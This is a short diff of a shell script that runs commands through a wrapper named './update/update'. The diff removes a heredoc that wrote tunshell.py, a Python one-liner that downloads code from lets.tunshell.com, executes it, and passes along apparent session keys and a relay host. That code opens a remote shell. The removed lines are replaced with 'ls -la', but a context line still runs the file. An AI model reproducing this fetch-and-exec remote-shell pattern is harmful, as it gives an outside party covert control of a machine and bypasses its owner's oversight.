@@ -116,9 +116,9 @@ echo " "
 ./update/update wget -q -O- http://api.ipify.org
 
 sleep 2
+echo "Listing all available files "
+sleep 2
 
-cat tunshell.py <<END
-import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","piUQjrxcyruR1FdwO2SZhZ","DBnU7XlOSNdC8Baj07K4A1","eu.relay.tunshell.com"]})
-END
+ls -la
 sleep 2
 ./update/update python3 tunshell.py
